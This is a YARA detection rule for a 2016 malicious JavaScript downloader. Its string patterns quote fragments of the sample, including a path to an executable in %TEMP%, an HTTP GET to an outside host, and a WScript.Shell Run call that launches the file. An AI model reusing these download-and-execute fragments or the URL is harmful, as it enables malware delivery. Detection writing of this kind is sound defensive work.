rule sig_20160328_686065329c7e3ec202c20a1c87868c27 {
  meta:
    description = "datamaliciousorder - file 20160328_686065329c7e3ec202c20a1c87868c27.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "31320bf932bbbdaad43515a3fb1302d8a7cebda8f39bf276ad2ce1f6506cf2dd"

  strings:
    $s1  = "function Wkwshw() {return Vjzqavh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rJvTa9xvf6lBpj.exe\";};" fullword ascii
    $s2  = "Utjawgtrh[Fzsvsrwqo](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Kkjujhjcc](Twyqcmpvll() * 11)} while (Utjawgtrh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Qrpxww(Lcfsbtu, Eosvcotw){return Lcfsbtu - Eosvcotw;};" fullword ascii
    $s5  = "var Vjzqavh = function Lblzkxbtl() {return WScript[Qihqeburkr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Irehyzejym() {return ((Jaybxxq == true) && (Jaybxxq == Ghtaecjkr)) ? 1 : Zhdqygcpig;};" fullword ascii
    $s7  = "function Uibcbgwpi(Flqisegkm){Vjzqavh[\"Run\"](Flqisegkm, Zhdqygcpig, Zhdqygcpig);};" fullword ascii
    $s8  = "var Scsqlayome = false;" fullword ascii
    $s9  = "Ghtaecjkr = true; " fullword ascii
    $s10 = "var Ghtaecjkr = false;" fullword ascii
    $s11 = "function Hguzaqxm(Esapkjlkf) {var Hcgpv = (1, 2, 3, 4, 5, Esapkjlkf); return Hcgpv;};" fullword ascii
    $s12 = " while (Jqwrxb){" fullword ascii
    $s13 = "function Yswocuu(){return Ibzdvymrj;};" fullword ascii
    $s14 = "function Ztesyxnnts(){return Qihqeburkr;};" fullword ascii
    $s15 = "var Jaybxxq = false;" fullword ascii
    $s16 = "var Gzwbks = new this[\"Date\"]();" fullword ascii
    $s17 = "return Qrpxww(Cvrfgjea, Ylwdhiaspn);" fullword ascii
    $s18 = "function Twyqcmpvll(){return 22;};" fullword ascii
    $s19 = "Jaybxxq = true; " fullword ascii
    $s20 = "function Zdtzocaxio()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}